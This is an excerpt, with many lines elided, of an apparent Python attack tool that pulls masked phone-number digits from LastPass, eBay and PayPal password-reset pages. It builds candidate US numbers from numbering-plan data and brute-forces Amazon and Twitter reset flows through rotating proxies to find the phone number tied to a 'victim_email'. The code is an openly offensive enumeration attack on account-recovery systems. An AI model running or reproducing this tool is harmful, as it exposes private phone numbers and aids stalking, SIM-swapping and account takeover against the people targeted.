...
def get_masked_email_amazon(phone_numbers, victim_email, verbose):
	...
	for phone_number in phone_numbers:
		...
		prevrid_search = re.search('name="prevRID" value="(.*)"', response.text).group(1)
		workflow_state = re.search('name="workflowState" value="(.*)"', response.text).group(1)
		app_action_token = re.search('name="appActionToken" value="(.*)" /><input', response.text).group(1)
		csmhit_cookie = {
			"version": 0,
			"name": 'csm-hit',
		...
		if "Location" in response.headers:
			...
			if "prevRID" in redirect_url:
				response = session.post(
					...
					data=
					"prevRID=" + urllib.quote(prevrid_search)
				...
				redirect_prev_rid = re.search('prevRID=([A-Z0-9]+)&', redirect_url).group(1)
				redirect_param_jwt = re.search('paramJwt=(.*)&', redirect_url).group(1)
				response = session.get(
					redirect_url,
					headers={
						"Cache-Control": "max-age=0",
		...
		if response.status_code >= 500:
			logger.warning("%s Error 500 returned for phone: %s %s", YELLOW, phone_number, ENDC)
			continue
		elif "We're sorry" in response.text:
			# Phone is not registered
			if verbose:
				logger.info("%s Phone %s not registered %s", YELLOW, phone_number, ENDC)
			continue
		elif "reached the maximum number of attempts" in response.text:
			if verbose:
				logger.info("%s MAX attempts reached when trying phone: %s %s", YELLOW, phone_number, ENDC)
			continue
		elif "Enter the characters above" in response.text:
			if verbose:
				logger.info("%s Captcha caught us trying number: %s %s", YELLOW, phone_number, ENDC)
			continue
			...
			response = session.post(
				...
				+ redirect_param_jwt
				+ "&pageId=usflex&ignoreAuthState=1&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_"
				...
				data="prevRID=" + prevrid_search + "&workflowState=" + workflow_state + "&fppOptions=notSkip",
				proxies=proxy,
				verify=verifyProxy
			)
			if not re.search(regex_email, response.text):
				...
				if verbose:
					logger.info("%s No masked email displayed for number: %s %s", YELLOW, phone_number, ENDC)
				continue
			...
			if \
				...
				logger.info("%s Possible phone number for %s is: %s %s", GREEN, victim_email, phone_number, ENDC)
				found_possible_number = True
			else:
				if verbose:
					logger.info("%s No match for email: %s and number: %s %s", YELLOW, masked_email, phone_number, ENDC)
			...
			logger.error("%s Unknown error: %s", RED, ENDC)
			if verbose:
				logger.error("%s %s %s", RED, response.text, ENDC)
			exit("Unknown error!")
	if not found_possible_number:
		logger.error("%s Couldn't find a phone number associated to %s %s", RED, args.email, ENDC)
...
def get_masked_email_twitter(phone_numbers, victim_email, verbose):
	...
	for phone_number in phone_numbers:
		...
		if regex_output and regex_output.group(1):
			...
			if verbose:
				logger.info("%s Twitter did not display a masked email for number: %s %s ", YELLOW, phone_number, ENDC)
			continue
		response = session.post(
			"https://twitter.com/account/begin_password_reset",
			headers = {
			...
			data="authenticity_token=" + authenticity_token + "&account_identifier=" + phone_number,
			allow_redirects=False,
			proxies=proxy,
			verify=verifyProxy
		)
		if \
			...
			logger.error(
				"%s Twitter reports MAX attempts reached. Need to change IP. It happened while trying phone %s %s ",
		...
		if regex_output and regex_output.group(1):
			...
			if \
				...
				logger.info(
					"%s Twitter found that the possible phone number for %s is: %s %s",
					GREEN, victim_email, phone_number, ENDC)
				found_possible_number = True
			else:
				if verbose:
					logger.info(
						"%s Twitter did not find a match for email: %s and number: %s %s",
						YELLOW, masked_email, phone_number, ENDC)
		else:
			if verbose:
				logger.info(
					"%s Twitter did not display a masked email for number: %s %s", YELLOW, phone_number, ENDC)
			continue
	if not found_possible_number:
		logger.error("%s Couldn't find a phone number associated to %s %s", RED, args.email, ENDC)
...
def scrape_last_pass(email):
	...
	last_two_digits = ""
	regex_output = re.search("We sent an SMS with a verification code to .*>(\+?)(.+([0-9]{2}))<\/strong>", response.text)
	if regex_output and regex_output.group(3):
		last_two_digits = regex_output.group(3)
		logger.info("%sLastpass reports that the last 2 digits are: %s %s", GREEN, last_two_digits, ENDC)
		if regex_output.group(1):
			logger.info("%sLastpass reports a non US phone number %s", GREEN, ENDC)
			logger.info(
...
def scrape_ebay(email):
	...
	response = session.post(
		...
		data=
		"ru=https%253A%252F%252Fwww.ebay.com%252F"
		+ "&showSignInOTP="
		+ "&signInUrl="
		+ "&clientapptype=19"
	...
	if regex_output:
		if regex_output.group(1):
			...
			logger.info("%sEbay reports that the first digit is: %s %s", GREEN, first_digit, ENDC)
		if regex_output.group(2):
			last_two_digits = regex_output.group(2)
			logger.info("%sEbay reports that the last 2 digits are: %s %s", GREEN, last_two_digits, ENDC)
	else:
		logger.info("%sEbay did not report any digits %s", YELLOW, ENDC)
...
def scrape_paypal(email):
	...
	if regex_output and regex_output.group(1):
		...
		logger.info("%s Paypal did not report any digits %s", YELLOW, ENDC)
		return
	...
	if regex_output and regex_output.group(3):
		...
		logger.info("%sPaypal reports that the last %s digits are: %s %s", GREEN, len(regex_output.group(3)), last_digits, ENDC)
		if regex_output.group(2):
			first_digit = regex_output.group(2)
			logger.info("%sPaypal reports that the first digit is: %s %s", GREEN, first_digit, ENDC)
		if regex_output.group(1):
			logger.info(
...
def get_possible_phone_numbers(masked_phone):
	...
	if \
		...
		logger.info("NANPA file missing or needs to be updated. Downloading now...")
	...
	# Area code + exchange
	regex_area_code_exchange = re.sub("X", "[0-9]{1}", "(" + masked_phone[:3] + "-" + masked_phone[3:6] + ")")
	# Format: [state, area_code-exchange]
	regex_possible_area_codes = re.findall(r"([A-Z]{2})\s\t" + regex_area_code_exchange + regex_assigned, file)
	...
	for possible_area_codes in regex_possible_area_codes:
		...
		for block_number in block_numbers:
			...
			for x in product("0123456789", repeat=remaining_unsolved_digits):
				possible_phone_numbers.append(area_code + exchange + block_number + masked_phone_formatted.format(*x))
...
def cache_valid_block_numbers(state, area_code):
	...
	response = session.post(
		...
		data="stateAbbr=" + state + "&npaId=" + area_code + "&rtCntrId=" + "ALL" + "&reportType=" + "3",
		proxies=proxy,
		verify=verifyProxy
	)
	...
	for area_code_cell in area_code_cells:
		if area_code_cell.string and area_code_cell.string.strip() == area_code:
			...
			if area_code not in poolingCache:
				...
				poolingCache[area_code][exchange] = {}
				poolingCache[area_code][exchange]['blockNumbers'] = []
			poolingCache[area_code][exchange]['blockNumbers'].append(block_number)
...
def set_proxy_list():
	...
	for proxy_not_formatted in proxy_list_not_formatted:
		...
		proxyList.append({proxy_not_formatted[:separator_position]: proxy_not_formatted[separator_position+3:]})
...
if args.action == "scrape":
	...
	if not re.match("^[0-9X]{10}", args.mask):
		logger.error("%sYou need to pass a US phone number masked as in: 555XXX1234", RED, ENDC)
		exit()
	if args.proxies:
		set_proxy_list()
	...
	if args.file:
		...
		logger.info("%sDictionary created successfully at %s %s", GREEN, os.path.realpath(f.name), ENDC)
		f.close()
	else:
		logger.info("%sThere are %s possible numbers %s", GREEN, str(len(possible_phone_number)), ENDC)
	...
	if (args.mask and args.file) or (not args.mask and not args.file):
		logger.error("%sYou need to provide a masked number or a file with numbers to try %s", RED, ENDC)
		exit()
	if args.mask and not re.match("^[0-9X]{10}", args.mask):
		logger.error("%sYou need to pass a 10-digit US phone number masked as in: 555XXX1234 %s", RED, ENDC)
		exit()
	...
	if args.proxies:
		set_proxy_list()
	start_brute_force(possiblePhoneNumbers, args.email, args.quiet, args.verbose)
else:
